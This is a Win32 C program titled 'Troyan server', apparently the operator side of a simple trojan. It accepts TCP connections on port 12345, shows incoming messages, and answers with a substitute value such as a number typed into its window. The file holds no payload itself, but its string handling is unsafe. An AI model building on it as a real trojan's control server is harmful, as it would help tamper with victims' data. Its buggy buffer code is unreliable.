#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#pragma comment(lib, "WSOCK32.lib")

struct threadData
{
    HWND mainWindowHandle;
    HWND fieldNo;
    HWND fieldHandle;
	SOCKET socket;
};


LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam){
    switch (msg){
	case WM_CREATE:
		CreateWindow(TEXT("button"), TEXT("send"), WS_VISIBLE | WS_CHILD | BS_CHECKBOX, 480, 20, 80, 30, hwnd, (HMENU)1, ((LPCREATESTRUCT)lParam)->hInstance, NULL);
		CheckDlgButton(hwnd, 1, BST_CHECKED);
		break;
	case WM_COMMAND: {
		if (wParam == 1) {
			int checked = (int)IsDlgButtonChecked(hwnd, 1);
			if (checked) {
				CheckDlgButton(hwnd, 1, BST_UNCHECKED);
			} else {
				CheckDlgButton(hwnd, 1, BST_CHECKED);
			}
		}
		if (wParam == 2){
			DestroyWindow(hwnd);
		}
		break;
	}
    case WM_CLOSE:
        DestroyWindow(hwnd);
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}


DWORD WINAPI dataReciver(void* args) {
	struct threadData* data = (struct threadData*)args;
	SOCKET si = data->socket;
	char  buffer[512];
	while (recv(si, buffer, 512, 0) > 0) {
		int outLength = GetWindowTextLengthA(data->fieldHandle) + strlen(buffer) + 2;
		char* newBuffer = (char*)GlobalAlloc(GPTR, outLength * sizeof(char));
		if (newBuffer == NULL) {
			GlobalFree(newBuffer);
			continue;
		}
		
		GetWindowTextA(data->fieldHandle, newBuffer, outLength - strlen(buffer) + 2);

		char* tmp = _strdup(newBuffer);
		strcpy(newBuffer, buffer);
		strcat(newBuffer, "\n"); 
		strcat(newBuffer, tmp);

		SetWindowTextA(data->fieldHandle, newBuffer);
		GlobalFree(newBuffer);
		free(tmp);

		if ((int)IsDlgButtonChecked(data->mainWindowHandle, 1)) {
			GetWindowTextA(data->fieldNo, buffer, GetWindowTextLengthA(data->fieldNo) + 1);
			send(si, buffer, 512, 0);
		} else {
			send(si, buffer, 512, 0);
		}
	}
	return 0;
}


DWORD WINAPI connectionCreator(void* args){
	struct threadData* data = (struct treadData*)args;
	
	WSADATA wsas;
	int result;
	WORD version;
	version = MAKEWORD(1, 1);
	result = WSAStartup(version, &wsas);

	SOCKET  sock;
	sock = socket(AF_INET, SOCK_STREAM, 0);

	struct  sockaddr_in  sa;
	memset((void*)(&sa), 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(12345);
	sa.sin_addr.s_addr = htonl(INADDR_ANY);

	result = bind(sock, (struct sockaddr FAR*) & sa, sizeof(sa));
	result = listen(sock, 5);

	SOCKET  si;
	struct  sockaddr_in  sc;
	int  lenc;
	while(1>0) {
		lenc = sizeof(sc);
		si = accept(sock, (struct  sockaddr  FAR*) & sc, &lenc);

		struct threadData dataForThread;
		dataForThread.socket = si;
		dataForThread.mainWindowHandle = data->mainWindowHandle;
		dataForThread.fieldNo = data->fieldNo;
		dataForThread.fieldHandle = data->fieldHandle;
		DWORD id;
		HANDLE reciving = CreateThread(
			NULL,           
			0,              
			dataReciver, 
			(void*)&dataForThread,
			0,              
			&id);
		if (reciving != INVALID_HANDLE_VALUE) {
			SetThreadPriority(reciving, THREAD_PRIORITY_NORMAL);
		}
	}
	return 0;
}


int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow){
    WNDCLASSEX wc;
    HWND hwnd;
    MSG Msg;
	const char g_szClassName[] = "myWindowClass";

    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = 0;
    wc.lpfnWndProc = WndProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = hInstance;
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)GetStockObject(GRAY_BRUSH);
    wc.lpszMenuName = NULL;
    wc.lpszClassName = g_szClassName;
    wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

    if (!RegisterClassEx(&wc)){
        MessageBox(NULL, L"Window Registration Failed!", L"Error!", MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }

    //Creating the Window
    hwnd = CreateWindowEx(
        WS_EX_CLIENTEDGE,
        g_szClassName,
        L"Troyan server",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 600, 400,
        NULL, NULL, hInstance, NULL);

    if (hwnd == NULL){
        MessageBox(NULL, L"Window Creation Failed!", L"Error!", MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }
	HWND button2 = CreateWindow(TEXT("button"), TEXT("Quit"), WS_VISIBLE | WS_CHILD, 480, 70, 80, 30, hwnd, (HMENU)2, NULL, NULL);
	HWND inputFromWindow = CreateWindowEx(WS_EX_CLIENTEDGE, TEXT("Edit"), TEXT("112233445566778899"), WS_VISIBLE | WS_CHILD, 20, 20, 440, 30, hwnd, (HMENU)3, NULL, NULL);
	HWND outputToWindow = CreateWindow(TEXT("Static"), TEXT(""), WS_VISIBLE | WS_CHILD, 20, 70, 440, 260, hwnd, (HMENU)3, NULL, NULL);

	struct threadData data;
	data.mainWindowHandle = hwnd;
	data.fieldNo = inputFromWindow;
	data.fieldHandle = outputToWindow;
	data.socket = NULL;
	DWORD id;
	HANDLE reciving = CreateThread(
		NULL,           
		0,              
		connectionCreator, 
		(void*)&data,
		0,
		&id);

	if (reciving != INVALID_HANDLE_VALUE) {
		SetThreadPriority(reciving, THREAD_PRIORITY_NORMAL);
	}
    
    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);

    //Message Loop
    while (GetMessage(&Msg, NULL, 0, 0) > 0){
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
    return Msg.wParam;
}